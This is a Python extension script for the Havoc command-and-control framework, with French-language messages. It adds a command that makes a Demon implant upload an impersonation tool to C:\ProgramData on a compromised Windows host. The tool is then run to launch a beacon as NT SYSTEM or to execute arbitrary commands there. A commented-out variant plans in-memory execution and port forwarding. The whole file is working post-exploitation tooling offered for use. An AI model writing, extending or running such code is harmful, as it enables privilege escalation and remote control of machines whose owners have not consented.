from havoc import Demon, RegisterCommand
import os
import sys
import argparse
from datetime import datetime

PATHTOFILE = "C:\\ProgramData\\"
EXECUTABLEFILE = None


def exit(_status=0, _message=None):
    pass


def print_message(message, _file=None):
    sys.stderr.write(message)
    raise ValueError(message)

def parse_args(params):
    parser = argparse.ArgumentParser(description='This tool implemant impersonnate in Havoc frameworks')
    parser.exit = exit
    parser._print_message = print_message

    subparsers = parser.add_subparsers(dest='command', required=True)
    
    parser_exec = subparsers.add_parser('SetExecutableFile', help='Set path to executable')
    parser_exec.add_argument('executable_path')

    parser_system = subparsers.add_parser('DemonAsSystem', help='Get shell as NT System')
    parser_system.add_argument('beacon_path')

    parser_passsthru = subparsers.add_parser('Exec', help='Command to execute on target')
    parser_passsthru.add_argument('commandline', nargs='+')

    ## parser_DLL = subparsers.add_parser('Inject', help='Dll inject in other process') // Incoming

    return parser.parse_args(args=params)


###def impersonnatelaunchinmemory( demonID, *param ):   // Incoming
###    global EXECUTABLEFILE
###    
###    demon  = Demon( demonID )
###    TaskID: str = demon.ConsoleWrite(demon.CONSOLE_TASK, "Success")
###    
###    try:
###        args = parse_args(param)
###    except Exception as e:
###        demon.ConsoleWrite(demon.CONSOLE_ERROR, str(e))
###
###    if args.command == 'SetExecutableFile':
###        EXECUTABLEFILE = args.executable_path
###        demon.ConsoleWrite(demon.CONSOLE_INFO, "Chemin Enregistrer")
###        #demon.Command(TaskID, f'upload {EXECUTABLEFILE} {dest_Ditto}')
###    elif args.command == 'DemonAsSystem':
###        if EXECUTABLEFILE is None:
###            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Vous devez executée la commande avec l'argument SetExecutableFile + Chemin vers l'executable sur votre machine")
###        else:
###            beaconpath = args.beacon_path
###            #demon.Command(TaskID, f"noconsolation {EXECUTABLEFILE} --continue-on-error --target-username syst exec --command {beaconpath} --detached")
###            #demon.Command(TaskID, f"noconsolation {EXECUTABLEFILE} --continue-on-error --target-username syst exec --command cmd.exe --detached")
###            demon.Command(TaskID, f"rportfwd")
###    else:
###        arg = " ".join(args.commandline)
###        demon.Command(TaskID, f"shell {dest_Ditto} {arg}")
###    return TaskID

def impersonnate( demonID, *param ):
    global EXECUTABLEFILE
    
    demon  = Demon( demonID )
    TaskID: str = demon.ConsoleWrite(demon.CONSOLE_TASK, "Success")
    dest_Ditto = f"{PATHTOFILE}{demonID}.exe"

    try:
        args = parse_args(param)
    except ValueError as e:
        error_message = str(e)
        
        if error_message == '':
             error_message = 'Unknown arguments parsing error'
        
        return demon.ConsoleWrite(demon.CONSOLE_TASK, error_message)
    
    if args.command == 'SetExecutableFile':
        EXECUTABLEFILE = args.executable_path
        demon.Command(TaskID, f'upload {EXECUTABLEFILE} {dest_Ditto}')
    elif args.command == 'DemonAsSystem':
        if EXECUTABLEFILE is None:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Vous devez executée la commande avec l'argument SetExecutableFile + Chemin vers l'executable sur votre machine")
        else:
            beaconpath = args.beacon_path
            demon.Command(TaskID, f"shell {dest_Ditto} --continue-on-error --target-username syst exec --command {beaconpath} --detached")
    else:
        arg = " ".join(args.commandline)
        demon.Command(TaskID, f"noconsolation {dest_Ditto} {arg}")
    
    return TaskID

RegisterCommand(impersonnate, "", "Ditto-uploads-run", "Uploads and run Ditto tool on the target", 0, "", "" )
# RegisterCommand(impersonnatelaunchinmemory, "", "Ditto-noconsolation", "run Ditto tool in memory of the target with no upload", 0, "", "" ) // Incoming